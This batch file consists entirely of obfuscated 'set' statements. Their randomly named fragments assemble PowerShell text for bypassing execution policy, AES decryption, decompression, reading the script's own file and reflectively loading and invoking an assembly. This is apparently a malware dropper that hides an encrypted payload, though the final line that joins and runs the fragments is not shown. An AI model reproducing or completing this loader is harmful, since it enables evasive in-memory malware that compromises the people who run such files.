@echo off
set "tbILOzxmGB=:: '"
set "YVbiDUMDOe=gMod"
set "BxbiJmYLEi= '')"
set "isZgYceyLi=UEOU"
set "oCZrTEbeOF=IlNr"
set "ZSlKoExhXP=QUEO"
set "HDpgLGViRL=[]] "
set "uxedirHPbJ=New-"
set "ziWusHkPTA=V) {"
set "gZxlfUveqe=106u"
set "cefsyNcZrf=orF'"
set "ysWuqZMDCg=.Key"
set "nJQEHLBVjp=flec"
set "QwcRDzZoJE=();$"
set "SspYdCjmGC=();$"
set "rJGusRLFoZ=]::("
set "ifZOtKbVNg=('da"
set "tyBtHAgcQB=3); "
set "JPrYAshfwq=ing("
set "AelhRAMOch=lit("
set "sxZnJOZZsw=embl"
set "mOsajppVzM=y]::"
set "TFseUOTzmd=nage"
set "WoOflQycfs=dj0C"
set "MjjIUAGfkb=PxEW"
set "YaRkktHrmD=ay()"
set "LUHUMWNAWh=1..-"
set "KinMkPxwpK=nirt"
set "FrGvZoPNrj=7;$z"
set "lWRbihNdqe=ress"
set "vCHVGfqRAg=[IO."
set "yteRcKsKDA=Comp"
set "mhTDghTMCd=-joi"
set "tGulqtuJdl=:('g"
set "LCzDqDzrwq=$Fhp"
set "wfqaCjxZzx=brea"
set "RUDvpPxRuo=$QUE"
set "OzcPSdbvAn=)($M"
set "dMIdpdzchK=l = "
set "XndOBBvxhp=..-1"
set "jjFbpMIAOq=tYf."
set "MEYjRqZprp=Invo"
set "YexaLueFMu=stem"
set "WDjdYLeLII=k; }"
set "MtWfcntLDX=);$s"
set "lCDJKbCxct= if "
set "rttBIfKlJa=rans"
set "KvbBcnzCjU=and "
set "ajkjMwTdJn=am;$"
set "SdCyxrEqwB=ode]"
set "ThtEKELlIq= [st"
set "dJHcupdtFH=le  "
set "yqZXDArFyF=ach "
set "meztMmylUZ=-4] "
set "JLqMNmATRd=CFxo"
set "elxJOpVJFQ=Disp"
set "GtUrDweqiT=ptog"
set "fpVSqEdQig=ck($"
set "VpMCVPJSns=rt]:"
set "VNCLuVHLWv=tS46"
set "ihBbLtrjHO=.Com"
set "jfRqOqQKyf=fVbz"
set "WQlRphwiJC= = $"
set "AaQVYIjCng=RmAx"
set "RjKVtvnOzf=hpel"
set "XhLUjwsjXt=xgIH"
set "fcyxiZqQvH=esaB"
set "nVapAsUase=UMyi"
set "omAXJclkcx=rity"
set "jnRvDZshlN=ss -"
set "KBcBpSowcT=6] -"
set "FYIvTBNhBW=yste"
set "maCKBtohDx=l5E7"
set "gdiDOCuyuK=zgar"
set "kEANUbytkc=pStr"
set "PPqxEZcQyM=ptor"
set "WHfoWDRIFG=m.IO"
set "VTDqUCvmgx=OU.D"
set "BwKiaNLqRJ=f.Su"
set "btVhLKhkUu=yTo("
set "mMprNxZUhz=.Con"
set "XohELTmvew=ring"
set "VKkPrOxSPm='[-1"
set "iPZdNppdKm=comp"
set "SKMXCtWKdn=se()"
set "QsSNCdvjVV=daeR"
set "AChCwnDapR=TllA"
set "krhQGXnIiQ=.IO."
set "eYzLvkhFOB=Disp"
set "hPCKfeWbMX=1] -"
set "zdPdlVaScL=Fina"
set "CCTchTKHUd='0Pg"
set "uZAQDGKLxh=$sxg"
set "Wydtgrqafx=Secu"
set "fjkrLuIIzy=('Tg"
set "VXNQJwMzYo=::De"
set "tKsKKTquuG=zuZI"
set "wwVdCGesor=em.I"
set "GetawyWfes=]::N"
set "DGTxCxRVvn=U = "
set "QhEzNOhrpJ=);$R"
set "PxidpgYrLq='')("
set "SXscooIypW=garW"
set "ViGZtPpyuV=el ="
set "DDHVRBaYgV=.Ass"
set "vRfkedpPbP=tYf "
set "jRmBCLNqee=.Mem"
set "GzzShNCjAP=[Sys"
set "wnbWJoyXhg==');"
set "CjdzKwLzwn=16] "
set "FDCsNyAYDz= = $"
set "LiMPbEvIHD=rJ.T"
set "lMYGdriqIA=vert"
set "ThTBpVKhiV=oArr"
set "bUjMeUrtrp=pres"
set "LDPnXXARYr=oL'["
set "EifoyjymDw=el);"
set "LAQNebYUCs=]::C"
set "nzftdTJpHz=$sxg"
set "JTBHpmEmMo=tryP"
set "chfVHUmjea=form"
set "QOIHVkiXNG=, $F"
set "aIIdgYFfjq=Syst"
set "yrfThUnlqi=urit"
set "ayIOgFVvvU=.Dis"
set "xzlPktNkEG=$JZY"
set "eHStYevUit=join"
set "YyCVIeriBI=] -j"
set "XYbwkcGUpI=srJ."
set "vuuiVQmPKb= [Sy"
set "gWkPVySnmC=ptog"
set "tDBgwVSpie=ion."
set "qOGGNVSXvg=ionM"
set "SBoaqDDVLT=gth)"
set "gsEmvFkEvB=JZYH"
set "jSzrPpDkaB=Myi."
set "naUODIzMSB=('%*'"
set "EuJobYZwJl=.Cry"
set "yujlTGdvBK=)($F"
set "dMCbGVwyZI=.Dis"
set "APYrQxOFyc=stem"
set "daIoOsTwhp=('%~f0'"
set "YSdxSnJxGB=y.Cr"
set "npeAAuRJgu=join"
set "ZUKxGbzjiW=m.IO"
set "QGdNIXlnBG= '')"
set "YUZCmAdJNm=Conv"
set "sihPjZQVzh=Fhpe"
set "yasaYgEduU=trea"
set "HRvDtAdxBx=lBlo"
set "WWHtUrPfwA=[Sys"
set "lyNYWJNXKx=m(, "
set "aWOJGHrnZC=g = "
set "kWWLSnrEKA=.Sec"
set "RHXQNNBiiZ=ew-O"
set "xPuxddjXcW=rity"
set "ZnraQWGqTX=New-"
set "kZMTmuveqg=iron"
set "BSYOfNdyyR=mory"
set "rPkeSzsRbO=bypa"
set "owjqMVrjtm=ddin"
set "YlDtmCAPcj=O.Me"
set "THsSVZYGan=V = "
set "nfUkJacvFf=F'[-"
set "QrHlPmfQXt=rtS4"
set "BrDLSnNsci=IlNr"
set "YkujJnTSBt=Secu"
set "daXTHSUjoS=);$z"
set "QuDEvoDRFX=m.Re"
set "DTVpoarxjQ=gnir"
set "xoHsIoweKK=tem."
set "BlllOwOiEi=onve"
set "GLiSbLrfjm=ose("
set "SXEVeNlqtp= [Sy"
set "QlFrSzfaxf=.Cre"
set "IxxVPzHoUP=Syst"
set "kHiqlYsMeW== $z"
set "onODFBOBkU=ress"
set "vegnFfBzAL=ect "
set "OAuIYZidKY=Stre"
set "fymoOXLXaG= = N"
set "jwBavzpyDp=S46e"
set "KCPnHunPqZ=garW"
set "GFTBpBksCy=; };"
set "eGCJVWinEX=;$cv"
set "ETJYxYmruo=, (,"
set "mmCfWCaISm=ypto"
set "opGLwKctIh=pose"
set "dWJyhdGRNu=Comp"
set "aQrWniyRPZ=.Mod"
set "JZkFcMzaEL=-nop"
set "ytmPijXxuS=e = "
set "CZEjhFZajH=::('"
set "nkYElPQoAg=grap"
set "hvkYwBaMGg=).Sp"
set "vvijyftsMM= = ["
set "ihixyTVRYS=sion"
set "dvxxytTxEy=YxVw"
set "vAfHfIfxSQ=tion"
set "CmzNxfLysJ=ispo"
set "UFUhYOHAsK=in $"
set "AczgJAHrHv=morF"
set "ypXZEETTLU=hpel"
set "ETXinmPZXE=esMa"
set "FqzAdTEbKA=PTtG"
set "GFqbtFvPYj=YHY."
set "TJHgAXBZIX=raph"
set "AKpTkSMLvR=n ''"
set "pwdQIudRtu=tsWi"
set "RibUDlTVCU=pose"
set "sltHQaIIwW=Fhpe"
set "rmDHenDqpN=Fhpe"
set "FWShtPPIPq=s75K"
set "RrcGbqlySv=ose("
set "aoAbVLIWVg=ct S"
set "wKJQfDHuCw=HY, "
set "zFhoJzspcw=ke($"
set "WNhOrmgXze=.Len"
set "SIzfTdZEFF=[Env"
set "JZdFzMeeLc=garW"
set "KxNKmpLfmD=)))"
set "TZPkRWpKtu=Obje"
set "fHyWktceZU=ne);"
set "VtlHYFQhDu=rofi"
set "PTrCfvIvak=null"
set "IQhuUgYbBx=  $M"
set "bBFjqmBgnB=.Cop"
set "rfefbYlLWm=($Pc"
set "WJGdPSjTUF=garW"
set "hQDWUVvsst=ecry"
set "JgvWNHHumg=comm"
set "UxYjDPAESs=$cvs"
set "EiQWlYpDXE=rW.I"
